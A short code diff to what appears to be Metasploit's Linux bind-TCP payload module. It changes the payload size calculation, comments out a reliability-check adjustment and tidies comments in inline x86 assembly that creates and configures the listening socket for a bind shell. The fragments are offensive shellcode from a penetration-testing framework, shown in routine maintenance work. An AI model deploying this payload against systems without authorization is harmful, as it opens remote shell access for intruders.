@@ -55,11 +55,11 @@ module Payload::Linux::BindTcp
   #
   def required_space
     # Start with our cached default generated size
-    # TODO: figure out what this should be
-    space = 300
+    space = cached_size
 
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
-    space += 14
+    # TODO: coming soon
+    #space += 14
 
     # The final estimated size
     space
@@ -96,8 +96,6 @@ module Payload::Linux::BindTcp
         mov al,0x66                   ; socketcall syscall
         int 0x80                      ; invoke socketcall (SYS_SOCKET)
 
-        ; TODO: verify that this is wanted (I think it should be),
-        ; TODO: and look to optimise this a little.
         ; set the SO_REUSEADDR flag on the socket
         push ecx
         push 4
@@ -114,7 +112,7 @@ module Payload::Linux::BindTcp
         int 0x80
         xchg eax,edi                  ; restore the socket handle
         add esp, 0x14
-        pop ecx
+        pop ecx                       ; restore ecx
 
         pop ebx
         pop esi
